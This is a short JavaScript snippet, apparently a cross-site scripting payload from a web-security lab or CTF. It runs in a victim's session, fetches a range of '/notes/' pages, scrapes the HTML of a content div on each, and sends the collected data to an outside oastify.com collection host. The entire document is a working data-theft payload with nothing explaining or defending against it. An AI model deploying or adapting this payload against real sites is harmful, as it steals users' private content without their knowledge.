// Array of URLs to fetch
const urls = ['/notes/75','/notes/76','/notes/77','/notes/78','/notes/79','/notes/80','/notes/81','/notes/82','/notes/83','/notes/84'];
let results = [];

// Function to process URLs recursively
function fetchNext(index) {
  if (index >= urls.length) {
    // All URLs processed, send the collected data
    fetch('https://66an85cubmljzetr1e0ebgqzuq0hoec3.oastify.com/collect?data='+encodeURIComponent(JSON.stringify(results)), {
      method: 'GET',
      mode: 'no-cors'
    });
    return;
  }
  
  // Fetch current URL
  fetch(urls[index]).then(r=>r.text()).then(d=>{
    let content = (new DOMParser()).parseFromString(d,'text/html').querySelector('div.bg-white.shadow-md.rounded-lg.p-6').innerHTML;
    results.push({url: urls[index], content: content});
    
    // Process next URL
    fetchNext(index + 1);
  }).catch(err => {
    results.push({url: urls[index], error: 'Failed to fetch'});
    fetchNext(index + 1);
  });
}

// Start the process
fetchNext(0);
